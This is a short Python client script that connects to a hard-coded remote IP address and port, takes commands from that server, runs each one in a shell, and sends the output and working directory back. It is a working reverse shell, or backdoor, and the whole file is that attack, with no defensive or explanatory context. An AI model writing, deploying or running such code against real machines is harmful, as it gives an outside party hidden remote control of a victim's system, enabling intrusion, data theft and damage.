# -*- coding: utf-8 -*-
# @Author: prateek
# @Date:   2020-10-04 16:06:47
# @Last Modified by:   prateek
# @Last Modified time: 2020-10-04 16:41:50

# Client file

import socket 
import sys
import os
import subprocess

s = socket.socket()
host = "139.59.11.223"
port = 9090

s.connect((host,port))

while True:
	data = s.recv(1024)
	if data[:2].decode('utf-8') == 'cd':
		os.chdir(data[3:].decode('utf-8'))

	if len(data) > 0:
		cmd = subprocess.Popen(data[:].decode('utf-8'),shell=True,stdout =subprocess.PIPE,stdin =subprocess.PIPE,stderr =subprocess.PIPE)
		cwd = os.getcwd()

		output = cmd.stdout.read() + cmd.stderr.read() 
		output_str = str(output,"utf-8")
		s.send(str.encode(output_str + cwd))

		print(output_str )